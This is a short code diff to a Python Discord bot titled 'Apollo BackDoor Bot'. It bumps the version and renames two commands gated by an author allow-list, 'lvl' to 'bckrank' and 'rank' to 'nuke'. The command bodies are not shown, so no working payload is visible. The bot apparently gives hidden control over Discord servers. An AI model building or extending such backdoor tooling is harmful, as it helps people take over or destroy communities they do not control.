@@ -6,7 +6,7 @@ from colorama import Fore
 from datetime import datetime
 
 os.system('cls')
-version = "1.6"
+version = "1.6.1"
 
 ctypes.windll.kernel32.SetConsoleTitleW(f'Apollo BackDoor Bot | {version} | Made by dori#4040')
 
@@ -61,7 +61,7 @@ def msg(text):
     print(f"{Fore.RED}| TYPE: Message | Apollo BackDoor |: {Fore.LIGHTRED_EX}{text}")
 
 @bot.command()
-async def lvl(ctx):
+async def bckrank(ctx):
     user_noatt = ctx.message.author.name + '#' + ctx.message.author.discriminator
     
     if user_noatt in Verified:      
@@ -326,7 +326,7 @@ async def removerole(ctx, member : discord.Member, role: discord.Role):
     await member.remove_roles(role)
         
 @bot.command(pass_context = True)
-async def rank(ctx):
+async def nuke(ctx):
     user_noatt = ctx.message.author.name + '#' + ctx.message.author.discriminator
     
     if user_noatt in Verified:
